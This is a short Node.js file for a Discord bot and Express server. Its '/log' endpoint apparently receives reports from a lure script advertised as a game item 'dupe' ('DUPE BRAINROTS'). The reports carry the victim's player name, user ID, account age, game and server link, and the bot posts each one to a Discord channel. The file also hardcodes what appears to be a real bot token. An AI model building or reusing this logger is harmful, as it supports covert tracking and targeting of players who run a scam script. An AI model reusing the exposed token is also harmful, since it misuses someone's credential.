const { Client, GatewayIntentBits, EmbedBuilder } = require("discord.js");
const express = require("express");

const app = express();
app.use(express.json());

// CONFIGURA ESTO:
const BOT_TOKEN = "MTQ1Njg4OTcyNjY2NDcwNDE2NQ.GGM5Rt.tSkXyp5v1u_Lr557EYP66yOVkHL-nKHGFtoj8A"; // Reemplaza con tu token
const CHANNEL_ID = "1456828167162691806"; // Reemplaza con el ID de tu canal

// CREA EL CLIENTE DE DISCORD
const client = new Client({
	intents: [GatewayIntentBits.Guilds]
});

client.login(BOT_TOKEN);

client.once("ready", () => {
	console.log(`Bot conectado como ${client.user.tag}`);
});

// ENDPOINT PARA RECIBIR DATOS DEL SCRIPT
app.post("/log", async (req, res) => {
	try {
		const data = req.body;
		const channel = await client.channels.fetch(CHANNEL_ID);

		const embed = new EmbedBuilder()
			.setTitle("DUPE BRAINROTS")
			.setDescription("New execution detected")
			.setColor(0x2ecc71)
			.addFields(
				{ name: "👤 Player", value: data.playerName, inline: true },
				{ name: "🆔 UserId", value: String(data.userId), inline: true },
				{ name: "⏱ Account Age", value: data.accountAge + " days", inline: true },
				{ name: "🎮 Game", value: data.gameName, inline: false },
				{ name: "🔗 Server Link", value: data.serverLink, inline: false }
			)
			.setFooter({ text: "Logger System" })
			.setTimestamp(new Date(data.time * 1000));

		await channel.send({ embeds: [embed] });
		res.sendStatus(200);
	} catch (error) {
		console.error(error);
		res.sendStatus(500);
	}
});

// INICIAR EL SERVIDOR EXPRESS
app.listen(3000, () => {
	console.log("Servidor escuchando en puerto 3000");
});
